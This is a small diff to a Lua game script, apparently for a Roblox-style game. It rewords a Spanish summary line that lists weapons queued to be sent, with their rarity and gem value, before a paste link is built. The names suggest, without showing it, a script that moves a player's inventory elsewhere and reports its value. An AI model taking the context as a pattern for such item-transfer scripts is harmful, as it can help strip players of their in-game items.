@@ -487,7 +487,7 @@ local pasteContent = ""
 for _, w in ipairs(weaponsToSend) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
 end
-pasteContent = pasteContent .. "\nValor total: "..tostring(totalValue).."💰"
+pasteContent = pasteContent .. "\nValor total del inventario📦: "..tostring(totalValue).."💰"
 
 local pasteLink
 if #weaponsToSend > 18 then
